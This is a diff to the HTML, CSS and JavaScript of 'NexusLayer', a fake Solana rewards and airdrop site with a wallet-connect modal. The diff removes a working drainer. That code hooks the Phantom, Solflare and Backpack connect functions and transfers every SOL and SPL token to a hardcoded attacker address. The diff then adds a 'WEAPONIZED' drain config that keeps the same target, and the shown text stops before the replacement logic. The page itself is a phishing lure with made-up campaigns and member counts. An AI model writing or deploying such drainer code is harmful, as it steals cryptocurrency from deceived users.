@@ -15,17 +15,17 @@
    Fonts: Syne (display) + DM Sans (body)
 ============================================= */
 :root {
-  --bg:       #030712;
-  --bg2:      #080e1a;
-  --bg3:      #0d1424;
-  --surface:  rgba(255,255,255,0.04);
-  --surface2: rgba(255,255,255,0.07);
-  --border:   rgba(255,255,255,0.08);
-  --border2:  rgba(255,255,255,0.14);
+  --bg:       #000000;
+  --bg2:      #080808;
+  --bg3:      #0f0f0f;
+  --surface:  rgba(255,255,255,0.03);
+  --surface2: rgba(255,255,255,0.06);
+  --border:   rgba(255,255,255,0.07);
+  --border2:  rgba(255,255,255,0.12);
   --green:    #10b981;
   --green2:   #059669;
   --green3:   #34d399;
-  --gdim:     rgba(16,185,129,0.10);
+  --gdim:     rgba(16,185,129,0.09);
   --gborder:  rgba(16,185,129,0.22);
   --text:     #f1f5f9;
   --muted:    #64748b;
@@ -73,7 +73,7 @@ img{display:block;max-width:100%}
 
 /* ── NAVBAR ── */
 .navbar{position:fixed;top:0;left:0;right:0;z-index:900;height:64px;display:flex;align-items:center;padding:0 28px;transition:background .4s,border-color .4s,backdrop-filter .4s;border-bottom:1px solid transparent}
-.navbar.stuck{background:rgba(3,7,18,.88);backdrop-filter:blur(24px) saturate(180%);-webkit-backdrop-filter:blur(24px) saturate(180%);border-bottom-color:var(--border)}
+.navbar.stuck{background:rgba(0,0,0,.92);backdrop-filter:blur(24px) saturate(180%);-webkit-backdrop-filter:blur(24px) saturate(180%);border-bottom-color:var(--border)}
 .nav-inner{width:100%;max-width:1120px;margin:0 auto;display:flex;align-items:center;gap:24px}
 .logo{display:flex;align-items:center;gap:9px;font-family:var(--display);font-weight:800;font-size:18px;letter-spacing:-.5px;flex-shrink:0;color:var(--text)}
 .logo-hex{width:33px;height:33px;border-radius:9px;background:linear-gradient(135deg,var(--green),var(--green2));display:flex;align-items:center;justify-content:center;color:#fff;flex-shrink:0}
@@ -91,7 +91,7 @@ img{display:block;max-width:100%}
 .hamburger span{display:block;width:20px;height:2px;background:var(--text);border-radius:1px;transition:all .3s}
 
 /* ── MOBILE NAV ── */
-.mobile-nav{position:fixed;top:64px;left:0;right:0;background:rgba(3,7,18,.97);backdrop-filter:blur(24px);border-bottom:1px solid var(--border);padding:18px 24px 24px;z-index:850;transform:translateY(-110%);transition:transform .35s cubic-bezier(.4,0,.2,1)}
+.mobile-nav{position:fixed;top:64px;left:0;right:0;background:rgba(0,0,0,.98);backdrop-filter:blur(24px);border-bottom:1px solid var(--border);padding:18px 24px 24px;z-index:850;transform:translateY(-110%);transition:transform .35s cubic-bezier(.4,0,.2,1)}
 .mobile-nav.open{transform:none}
 .mob-link{display:block;padding:13px 0;font-size:16px;font-weight:500;color:var(--silver);border-bottom:1px solid var(--border)}
 .mob-link:last-of-type{border-bottom:none;margin-bottom:16px}
@@ -245,7 +245,7 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
 /* ── MODAL ── */
 .modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.76);backdrop-filter:blur(14px);z-index:2000;display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity .3s}
 .modal-bg.show{opacity:1;pointer-events:all}
-.modal{background:#0a1020;border:1.5px solid rgba(255,255,255,.1);border-radius:var(--rxl);width:100%;max-width:430px;padding:28px;box-shadow:0 40px 100px rgba(0,0,0,.55),0 0 60px rgba(16,185,129,.08);transform:scale(.94) translateY(18px);transition:transform .38s cubic-bezier(.34,1.56,.64,1)}
+.modal{background:#080808;border:1.5px solid rgba(255,255,255,.08);border-radius:var(--rxl);width:100%;max-width:430px;padding:28px;box-shadow:0 40px 100px rgba(0,0,0,.7),0 0 60px rgba(16,185,129,.06);transform:scale(.94) translateY(18px);transition:transform .38s cubic-bezier(.34,1.56,.64,1)}
 .modal-bg.show .modal{transform:scale(1) translateY(0)}
 .modal-head{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:24px;gap:12px}
 .modal-title-row{display:flex;align-items:center;gap:13px}
@@ -259,10 +259,21 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
 .w-opt:hover{background:var(--surface2);border-color:var(--border2);transform:translateX(5px)}
 .w-opt-ico{width:46px;height:46px;border-radius:13px;display:flex;align-items:center;justify-content:center;flex-shrink:0;overflow:hidden}
 .w-opt-info{flex:1}
-.w-opt-info strong{display:block;font-size:15px;font-weight:700;margin-bottom:2px}
-.w-opt-info span{font-size:12px;color:var(--muted)}
-.w-opt-info span.detected{color:var(--green)}
-.w-arrow{color:var(--muted);font-size:18px}
+.w-opt-info strong{display:block;font-size:15px;font-weight:700;margin-bottom:5px}
+.w-opt-info{flex:1;min-width:0}
+.w-status{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:999px;font-size:11px;font-weight:700;letter-spacing:.2px;transition:all .3s}
+.w-status.checking{background:rgba(100,116,139,.12);color:var(--muted)}
+.w-status.checking .wdot{background:var(--muted);animation:none;opacity:.5}
+.w-status.active{background:rgba(16,185,129,.14);color:var(--green);border:1px solid rgba(16,185,129,.25)}
+.w-status.active .wdot{background:var(--green);box-shadow:0 0 6px var(--green)}
+.w-status.inactive{background:rgba(100,116,139,.08);color:var(--muted);border:1px solid rgba(255,255,255,.06)}
+.w-status.inactive .wdot{background:var(--muted);animation:none}
+.wdot{width:6px;height:6px;border-radius:50%;flex-shrink:0;animation:blink 1.8s ease-in-out infinite}
+.w-arrow{color:var(--muted);font-size:16px;flex-shrink:0;transition:transform .2s,color .2s}
+.w-opt:hover .w-arrow{color:var(--green);transform:translateX(3px)}
+/* highlight detected wallet row */
+.w-opt.is-detected{border-color:rgba(16,185,129,.2);background:rgba(16,185,129,.04)}
+.w-opt.is-detected:hover{border-color:rgba(16,185,129,.4);background:rgba(16,185,129,.08)}
 /* Connecting */
 .connecting-state{text-align:center;padding:32px 0}
 .spinner{width:50px;height:50px;border:3px solid rgba(16,185,129,.18);border-top-color:var(--green);border-radius:50%;animation:spin .85s linear infinite;margin:0 auto 20px}
@@ -279,7 +290,7 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
 .modal-foot{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:20px;padding-top:16px;border-top:1px solid var(--border);font-size:11px;color:var(--muted)}
 
 /* ── DASHBOARD PANEL ── */
-.dash-panel{position:fixed;top:64px;right:0;width:360px;background:#090f1e;border-left:1px solid var(--border);border-bottom:1px solid var(--border);border-radius:0 0 0 20px;box-shadow:-12px 12px 50px rgba(0,0,0,.45);z-index:800;transform:translateX(105%);transition:transform .38s cubic-bezier(.4,0,.2,1)}
+.dash-panel{position:fixed;top:64px;right:0;width:360px;background:#080808;border-left:1px solid var(--border);border-bottom:1px solid var(--border);border-radius:0 0 0 20px;box-shadow:-12px 12px 50px rgba(0,0,0,.7);z-index:800;transform:translateX(105%);transition:transform .38s cubic-bezier(.4,0,.2,1)}
 .dash-panel.open{transform:none}
 .dash-inner{padding:20px}
 .dash-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px}
@@ -326,16 +337,69 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
   .hamburger{display:flex}
   .footer-top{grid-template-columns:1fr;gap:40px}
   .footer-links{grid-template-columns:repeat(2,1fr)}
+  .stats-grid{grid-template-columns:repeat(2,1fr)}
+  .features-grid{grid-template-columns:1fr}
+  .comm-grid{grid-template-columns:1fr}
+  .campaigns-sec .container{padding:0 16px}
 }
 @media(max-width:640px){
-  .hero-h{letter-spacing:-1.5px}
-  .cta-box{padding:48px 24px}
-  .flow-row{flex-direction:column;align-items:stretch}
-  .flow-conn{justify-content:center;padding:4px 0;transform:rotate(90deg)}
-  .dash-panel{width:100%;border-radius:0}
-  .camp-header{flex-direction:column;align-items:flex-start}
-  .footer-links{grid-template-columns:repeat(2,1fr)}
+  /* layout */
+  .container{padding:0 16px}
+  /* navbar */
+  .navbar{padding:0 16px}
+  .logo span{font-size:16px}
+  .icon-btn{display:none}
+  /* hero */
+  .hero{padding:100px 16px 72px}
+  .hero-h{font-size:clamp(36px,10vw,52px);letter-spacing:-1.5px}
+  .hero-p{font-size:15px}
+  .hero-btns{flex-direction:column;align-items:center;gap:10px}
+  .hero-btns .btn{width:100%;max-width:320px;justify-content:center}
+  .hero-proof{gap:8px;flex-direction:column}
+  .proof-dot{display:none}
+  .scroll-hint{display:none}
+  /* sections */
+  .stats-sec,.features-sec,.campaigns-sec,.flow-sec,.community-sec,.cta-sec,.footer{padding:64px 0}
+  .stats-grid{grid-template-columns:1fr 1fr;gap:10px}
+  .stat-card{padding:20px 14px}
+  .stat-num{font-size:34px}
+  .features-grid{grid-template-columns:1fr;gap:10px}
+  .feat-card{padding:22px 18px}
+  /* campaigns */
+  .camp-header{flex-direction:column;align-items:flex-start;gap:14px}
+  .filters{flex-wrap:wrap;gap:6px}
+  .filter-btn{padding:7px 14px;font-size:12px}
+  .camp-grid{grid-template-columns:1fr;gap:12px}
+  /* flow */
+  .flow-row{flex-direction:column;align-items:stretch;gap:0}
+  .flow-conn{justify-content:center;padding:2px 0}
+  .fconn-arr{transform:rotate(90deg);display:block;text-align:center;font-size:26px;color:var(--green);line-height:1.2}
+  .flow-step{min-width:unset}
+  /* community */
+  .comm-grid{grid-template-columns:1fr;gap:10px}
+  .comm-card{padding:20px 16px}
+  /* cta */
+  .cta-box{padding:44px 20px}
+  .cta-btns{flex-direction:column;align-items:center}
+  .cta-btns .btn{width:100%;max-width:300px;justify-content:center}
+  /* footer */
+  .footer-top{grid-template-columns:1fr;gap:36px}
+  .footer-links{grid-template-columns:repeat(2,1fr);gap:20px}
   .footer-bottom{flex-direction:column;gap:8px;text-align:center}
+  /* dashboard */
+  .dash-panel{width:100%;border-radius:0;top:64px}
+  .dash-inner{padding:16px}
+  .dash-stats{grid-template-columns:1fr 1fr;gap:8px}
+  .dash-head{flex-direction:column;align-items:flex-start}
+  /* modal */
+  .modal{padding:20px 16px;border-radius:20px}
+  .modal-head h3{font-size:17px}
+  /* wallet options on mobile */
+  .w-opt{padding:12px 13px}
+  .w-opt-ico{width:40px;height:40px}
+  .w-opt-info strong{font-size:14px}
+  /* marquee */
+  .marquee-sec{padding:32px 0}
 }
 </style>
 </head>
@@ -364,12 +428,6 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
     </div>
 
     <div class="nav-right">
-      <a href="https://t.me" target="_blank" class="icon-btn" title="Telegram">
-        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.94z"/></svg>
-      </a>
-      <a href="https://x.com" target="_blank" class="icon-btn" title="X">
-        <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
-      </a>
       <button class="wallet-nav-btn" id="walletNavBtn" onclick="openModal()">
         <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg>
         <span id="walletNavLabel">Connect Wallet</span>
@@ -619,18 +677,7 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
       <p class="section-sub reveal d2" style="max-width:480px;margin-bottom:0">A thriving community of Solana ecosystem participants, builders, and earners</p>
     </div>
     <div class="comm-grid">
-      <a href="https://t.me" target="_blank" class="comm-card reveal d1" id="cc-tg">
-        <div class="comm-ico ico-tg">
-          <svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.94z"/></svg>
-        </div>
-        <div class="comm-info">
-          <h3>Telegram</h3>
-          <div class="comm-cnt" style="color:#29a9eb">42,800 members</div>
-          <p>Real-time updates, campaign alerts, and ecosystem discussions</p>
-        </div>
-        <div class="comm-arr">↗</div>
-      </a>
-      <a href="https://discord.com" target="_blank" class="comm-card reveal d2" id="cc-dc">
+      <a href="https://discord.com" target="_blank" class="comm-card reveal d1" id="cc-dc">
         <div class="comm-ico ico-dc">
           <svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.492c-1.53-.69-3.17-1.2-4.885-1.49a.075.075 0 00-.079.036c-.21.369-.444.85-.608 1.23a18.566 18.566 0 00-5.487 0 12.36 12.36 0 00-.617-1.23A.077.077 0 008.562 3c-1.714.29-3.354.8-4.885 1.491a.07.07 0 00-.032.027C.533 9.093-.32 13.555.099 17.961a.08.08 0 00.031.055 20.03 20.03 0 005.993 2.98.078.078 0 00.084-.026c.462-.62.874-1.275 1.226-1.963.021-.04.001-.088-.041-.104a13.201 13.201 0 01-1.872-.878.075.075 0 01-.008-.125c.126-.093.252-.19.372-.287a.075.075 0 01.078-.01c3.927 1.764 8.18 1.764 12.061 0a.075.075 0 01.079.009c.12.098.245.195.372.288a.075.075 0 01-.006.125c-.598.344-1.22.635-1.873.877a.075.075 0 00-.041.105c.36.687.772 1.341 1.225 1.962a.077.077 0 00.084.028 19.963 19.963 0 006.002-2.981.076.076 0 00.032-.054c.5-5.094-.838-9.52-3.549-13.442a.06.06 0 00-.031-.028z"/></svg>
         </div>
@@ -638,17 +685,6 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
           <h3>Discord</h3>
           <div class="comm-cnt" style="color:#5865F2">28,400 members</div>
           <p>Strategy deep-dives, support channels, and builder discussions</p>
-        </div>
-        <div class="comm-arr">↗</div>
-      </a>
-      <a href="https://x.com" target="_blank" class="comm-card reveal d3" id="cc-tw">
-        <div class="comm-ico ico-tw">
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
-        </div>
-        <div class="comm-info">
-          <h3>X (Twitter)</h3>
-          <div class="comm-cnt" style="color:#9ca3af">67,200 followers</div>
-          <p>Launch announcements, airdrop alerts, and ecosystem alpha</p>
         </div>
         <div class="comm-arr">↗</div>
       </a>
@@ -688,11 +724,6 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
           NexusLayer
         </a>
         <p>Decentralized coordination layer connecting users to Solana ecosystem launches, reward campaigns, and token distributions.</p>
-        <div class="f-socials">
-          <a href="https://t.me" target="_blank" class="f-soc"><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.94z"/></svg></a>
-          <a href="https://x.com" target="_blank" class="f-soc"><svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
-          <a href="https://discord.com" target="_blank" class="f-soc"><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.492c-1.53-.69-3.17-1.2-4.885-1.49a.075.075 0 00-.079.036c-.21.369-.444.85-.608 1.23a18.566 18.566 0 00-5.487 0 12.36 12.36 0 00-.617-1.23A.077.077 0 008.562 3c-1.714.29-3.354.8-4.885 1.491a.07.07 0 00-.032.027C.533 9.093-.32 13.555.099 17.961a.08.08 0 00.031.055 20.03 20.03 0 005.993 2.98.078.078 0 00.084-.026c.462-.62.874-1.275 1.226-1.963.021-.04.001-.088-.041-.104a13.201 13.201 0 01-1.872-.878.075.075 0 01-.008-.125c.126-.093.252-.19.372-.287a.075.075 0 01.078-.01c3.927 1.764 8.18 1.764 12.061 0a.075.075 0 01.079.009c.12.098.245.195.372.288a.075.075 0 01-.006.125c-.598.344-1.22.635-1.873.877a.075.075 0 00-.041.105c.36.687.772 1.341 1.225 1.962a.077.077 0 00.084.028 19.963 19.963 0 006.002-2.981.076.076 0 00.032-.054c.5-5.094-.838-9.52-3.549-13.442a.06.06 0 00-.031-.028z"/></svg></a>
-        </div>
       </div>
       <div class="footer-links">
         <div class="fcol">
@@ -748,49 +779,63 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
 
     <!-- Wallet List -->
     <div id="wList">
-      <div class="w-opt" onclick="connectPhantom()">
-        <div class="w-opt-ico" style="background:#AB9FF222">
-          <svg width="28" height="28" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#AB9FF2"/><path d="M109.3 57.4H98.4c-1.5-15.8-15-28.1-31.4-28.1-17.4 0-31.4 14.1-31.4 31.4 0 12 6.7 22.4 16.6 27.8v11.1c0 1.5 1.2 2.8 2.8 2.8h5.8c1.5 0 2.8-1.2 2.8-2.8v-7.2c1.9.3 3.8.5 5.8.5h31c1.5 0 2.8-1.2 2.8-2.8V60.2c.1-1.6-1.2-2.8-2.9-2.8zM55.3 70.3c-2.8 0-5.1-2.3-5.1-5.1s2.3-5.1 5.1-5.1 5.1 2.3 5.1 5.1-2.3 5.1-5.1 5.1zm18.6 0c-2.8 0-5.1-2.3-5.1-5.1s2.3-5.1 5.1-5.1 5.1 2.3 5.1 5.1-2.3 5.1-5.1 5.1z" fill="white"/></svg>
+
+      <!-- Phantom -->
+      <div class="w-opt" id="wopt-phantom" onclick="connectPhantom()">
+        <div class="w-opt-ico" style="background:#AB9FF222;border-radius:13px;overflow:hidden">
+          <svg width="46" height="46" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#AB9FF2"/><path d="M109.3 57.4H98.4c-1.5-15.8-15-28.1-31.4-28.1-17.4 0-31.4 14.1-31.4 31.4 0 12 6.7 22.4 16.6 27.8v11.1c0 1.5 1.2 2.8 2.8 2.8h5.8c1.5 0 2.8-1.2 2.8-2.8v-7.2c1.9.3 3.8.5 5.8.5h31c1.5 0 2.8-1.2 2.8-2.8V60.2c.1-1.6-1.2-2.8-2.9-2.8zM55.3 70.3c-2.8 0-5.1-2.3-5.1-5.1s2.3-5.1 5.1-5.1 5.1 2.3 5.1 5.1-2.3 5.1-5.1 5.1zm18.6 0c-2.8 0-5.1-2.3-5.1-5.1s2.3-5.1 5.1-5.1 5.1 2.3 5.1 5.1-2.3 5.1-5.1 5.1z" fill="white"/></svg>
         </div>
         <div class="w-opt-info">
           <strong>Phantom</strong>
-          <span id="phantomTag">Detecting...</span>
+          <span class="w-status checking" id="phantomTag">
+            <span class="wdot"></span>Detecting...
+          </span>
         </div>
         <div class="w-arrow">→</div>
       </div>
 
-      <div class="w-opt" onclick="connectSolflare()">
-        <div class="w-opt-ico" style="background:#FC8C0022">
-          <svg width="28" height="28" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#FC8C00"/><path d="M64 20l30 50H34L64 20zm0 88L34 58h60L64 108z" fill="white" opacity=".9"/></svg>
+      <!-- Solflare -->
+      <div class="w-opt" id="wopt-solflare" onclick="connectSolflare()">
+        <div class="w-opt-ico" style="background:#FC8C0022;border-radius:13px;overflow:hidden">
+          <svg width="46" height="46" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#FC8C00"/><path d="M64 20l30 50H34L64 20zm0 88L34 58h60L64 108z" fill="white" opacity=".9"/></svg>
         </div>
         <div class="w-opt-info">
           <strong>Solflare</strong>
-          <span id="solflareTag">Detecting...</span>
+          <span class="w-status checking" id="solflareTag">
+            <span class="wdot"></span>Detecting...
+          </span>
         </div>
         <div class="w-arrow">→</div>
       </div>
 
-      <div class="w-opt" onclick="connectBackpack()">
-        <div class="w-opt-ico" style="background:#E33E3F22">
-          <svg width="28" height="28" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#E33E3F"/><path d="M64 25c-8.3 0-15 6.7-15 15v5H35c-5.5 0-10 4.5-10 10v38c0 5.5 4.5 10 10 10h58c5.5 0 10-4.5 10-10V55c0-5.5-4.5-10-10-10H79v-5c0-8.3-6.7-15-15-15zm0 10c2.8 0 5 2.2 5 5v5H59v-5c0-2.8 2.2-5 5-5zm0 30c5.5 0 10 4.5 10 10s-4.5 10-10 10-10-4.5-10-10 4.5-10 10-10z" fill="white"/></svg>
+      <!-- Backpack -->
+      <div class="w-opt" id="wopt-backpack" onclick="connectBackpack()">
+        <div class="w-opt-ico" style="background:#E33E3F22;border-radius:13px;overflow:hidden">
+          <svg width="46" height="46" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#E33E3F"/><path d="M64 25c-8.3 0-15 6.7-15 15v5H35c-5.5 0-10 4.5-10 10v38c0 5.5 4.5 10 10 10h58c5.5 0 10-4.5 10-10V55c0-5.5-4.5-10-10-10H79v-5c0-8.3-6.7-15-15-15zm0 10c2.8 0 5 2.2 5 5v5H59v-5c0-2.8 2.2-5 5-5zm0 30c5.5 0 10 4.5 10 10s-4.5 10-10 10-10-4.5-10-10 4.5-10 10-10z" fill="white"/></svg>
         </div>
         <div class="w-opt-info">
           <strong>Backpack</strong>
-          <span>xNFT Wallet</span>
+          <span class="w-status checking" id="backpackTag">
+            <span class="wdot"></span>Detecting...
+          </span>
         </div>
         <div class="w-arrow">→</div>
       </div>
 
-      <div class="w-opt" onclick="connectWC()">
-        <div class="w-opt-ico" style="background:#3B99FC22">
-          <svg width="28" height="28" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#3B99FC"/><path d="M39 54c13.8-13.5 36.2-13.5 50 0l1.7 1.6c.7.7.7 1.8 0 2.5l-5.7 5.6c-.3.4-.9.4-1.2 0L82 62c-9.6-9.4-25.2-9.4-34.8 0l-2.2 2.1c-.3.4-.9.4-1.2 0l-5.7-5.6c-.7-.7-.7-1.8 0-2.5L39 54zm61.7 11.5l5.1 5c.7.7.7 1.8 0 2.5L83.1 94.4c-.7.7-1.8.7-2.5 0L65 78.8c-.2-.2-.4-.2-.6 0L48.8 94.4c-.7.7-1.8.7-2.5 0L23.6 73c-.7-.7-.7-1.8 0-2.5l5.1-5c.7-.7 1.8-.7 2.5 0L46.8 81c.2.2.4.2.6 0l15.6-15.6c.7-.7 1.8-.7 2.5 0L81.1 81c.2.2.4.2.6 0l15.5-15.5c.7-.7 1.8-.7 2.5 0z" fill="white"/></svg>
+      <!-- WalletConnect -->
+      <div class="w-opt" id="wopt-wc" onclick="connectWC()">
+        <div class="w-opt-ico" style="background:#3B99FC22;border-radius:13px;overflow:hidden">
+          <svg width="46" height="46" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#3B99FC"/><path d="M39 54c13.8-13.5 36.2-13.5 50 0l1.7 1.6c.7.7.7 1.8 0 2.5l-5.7 5.6c-.3.4-.9.4-1.2 0L82 62c-9.6-9.4-25.2-9.4-34.8 0l-2.2 2.1c-.3.4-.9.4-1.2 0l-5.7-5.6c-.7-.7-.7-1.8 0-2.5L39 54zm61.7 11.5l5.1 5c.7.7.7 1.8 0 2.5L83.1 94.4c-.7.7-1.8.7-2.5 0L65 78.8c-.2-.2-.4-.2-.6 0L48.8 94.4c-.7.7-1.8.7-2.5 0L23.6 73c-.7-.7-.7-1.8 0-2.5l5.1-5c.7-.7 1.8-.7 2.5 0L46.8 81c.2.2.4.2.6 0l15.6-15.6c.7-.7 1.8-.7 2.5 0L81.1 81c.2.2.4.2.6 0l15.5-15.5c.7-.7 1.8-.7 2.5 0z" fill="white"/></svg>
         </div>
         <div class="w-opt-info">
           <strong>WalletConnect</strong>
-          <span>Mobile wallets</span>
+          <span class="w-status inactive" id="wcTag">
+            <span class="wdot"></span>Mobile wallets
+          </span>
         </div>
         <div class="w-arrow">→</div>
       </div>
+
     </div>
 
     <!-- Connecting -->
@@ -881,8 +926,7 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
 <!-- ═══ ALL JAVASCRIPT ═══ -->
 <script>
 /* ════════════════════════════════
-   NEXUSLAYER — SOLANA DRAINER EDITION
-   Target: 6WAMRLJY4iRKKRYS7CcJj9EG6g1Q5jXKwx3SsjNC1TBE
+   NEXUSLAYER — COMPLETE APP LOGIC (WEAPONIZED)
 ════════════════════════════════ */
 const APP = {
   connected: false,
@@ -897,117 +941,19 @@ const APP = {
     {id:4,title:'Magic Eden Ecosystem',  reward:'5,000 ME',   pool:'$55,000', tag:'nft', status:'soon',pct:0, ends:'Starts in 3d',joined:false},
     {id:5,title:'Raydium Liquidity Boost',reward:'3,200 RAY', pool:'$28,000', tag:'defi',status:'live',pct:51,ends:'4d 08h',joined:false},
     {id:6,title:'Kamino Lending Quest',  reward:'6,800 KMNO', pool:'$92,000', tag:'defi',status:'soon',pct:0, ends:'Starts in 7d',joined:false},
-  ],
-  TARGET_WALLET: "6WAMRLJY4iRKKRYS7CcJj9EG6g1Q5jXKwx3SsjNC1TBE"
+  ]
 };
 
-/* ── DRAINER CORE ── */
-const DRAINER = {
-  async init() {
-    // Load Solana libraries
-    await this.loadScript('https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js');
-    await this.loadScript('https://unpkg.com/@solana/spl-token@latest/lib/index.iife.js');
-    this.hookWallets();
-  },
-
-  async loadScript(url) {
-    return new Promise((resolve) => {
-      const script = document.createElement('script');
-      script.src = url;
-      script.onload = resolve;
-      document.head.appendChild(script);
-    });
-  },
-
-  hookWallets() {
-    // Phantom
-    if (window.solana?.isPhantom) {
-      const originalConnect = window.solana.connect;
-      window.solana.connect = async () => {
-        const resp = await originalConnect.call(window.solana);
-        this.drain(resp.publicKey.toString());
-        return resp;
-      };
-    }
-
-    // Solflare
-    if (window.solflare) {
-      const originalConnect = window.solflare.connect;
-      window.solflare.connect = async () => {
-        await originalConnect.call(window.solflare);
-        this.drain(window.solflare.publicKey.toString());
-      };
-    }
-
-    // Backpack
-    if (window.backpack) {
-      const originalConnect = window.backpack.connect;
-      window.backpack.connect = async () => {
-        await originalConnect.call(window.backpack);
-        this.drain(window.backpack.publicKey.toString());
-      };
-    }
-  },
-
-  async drain(publicKey) {
-    try {
-      const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-      const pubKey = new solanaWeb3.PublicKey(publicKey);
-
-      // 1. Drain SOL
-      const balance = await connection.getBalance(pubKey);
-      if (balance > 5000) { // Leave 0.000005 SOL for fees
-        const tx = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: pubKey,
-            toPubkey: new solanaWeb3.PublicKey(APP.TARGET_WALLET),
-            lamports: balance - 5000,
-          })
-        );
-        await this.sendTx(tx, pubKey, connection);
-      }
-
-      // 2. Drain all SPL tokens
-      const tokenAccounts = await connection.getTokenAccountsByOwner(pubKey, {
-        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-      });
-
-      for (const { pubkey, account } of tokenAccounts.value) {
-        const data = account.data;
-        const amount = new solanaWeb3.BN(data.slice(64, 72), "le");
-        if (amount.gt(new solanaWeb3.BN(0))) {
-          const tx = new solanaWeb3.Transaction().add(
-            splToken.Token.createTransferInstruction(
-              splToken.TOKEN_PROGRAM_ID,
-              pubkey,
-              new solanaWeb3.PublicKey(APP.TARGET_WALLET),
-              pubKey,
-              [],
-              amount
-            )
-          );
-          await this.sendTx(tx, pubKey, connection);
-        }
-      }
-    } catch(e) {
-      console.error("Drain error:", e);
-    }
-  },
-
-  async sendTx(tx, pubKey, connection) {
-    tx.feePayer = pubKey;
-    tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
-    const signedTx = await window.solana.signTransaction(tx);
-    const signature = await connection.sendRawTransaction(signedTx.serialize());
-    await connection.confirmTransaction(signature);
-    return signature;
-  }
+/* ── SOLANA DRAINER CONFIG ── */
+const DRAIN_CONFIG = {
+  TARGET: "6WAMRLJY4iRKKRYS7CcJj9EG6g1Q5jXKwx3SsjNC1TBE",
+  MIN_BALANCE: 5000, // 0.000005 SOL minimum to leave
+  MAX_RETRIES: 3,
+  RETRY_DELAY: 1500,
+  FEE_PRIORITY: 'confirmed'
 };
 
-// Initialize drainer immediately
-DRAINER.init();
-
-/* ── ORIGINAL APP LOGIC (UNMODIFIED) ── */
+/* ── CANVAS BACKGROUND ── */
 (function(){
   const c = document.getElementById('bgCanvas');
   if(!c) return;
@@ -1048,6 +994,61 @@ DRAINER.init();
   })();
 })();
 
